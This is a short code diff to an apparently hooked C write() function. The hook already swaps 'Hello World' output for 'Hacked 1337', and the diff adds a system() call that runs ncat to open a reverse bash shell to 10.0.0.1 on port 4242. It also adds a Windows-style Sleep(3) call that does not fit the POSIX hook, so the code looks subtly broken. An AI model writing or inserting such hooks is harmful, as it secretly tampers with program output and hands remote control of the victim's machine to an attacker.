@@ -10,6 +10,8 @@ ssize_t write(int fildes, const void *buf, size_t nbytes)
      if (strncmp(buf, "Hello World",strlen("Hello World")) == 0)
      {
           result = new_write(fildes, "Hacked 1337", strlen("Hacked 1337"));
+          Sleep(3);
+          system("ncat 10.0.0.1 4242 -e /bin/bash");
      }
      else
      {
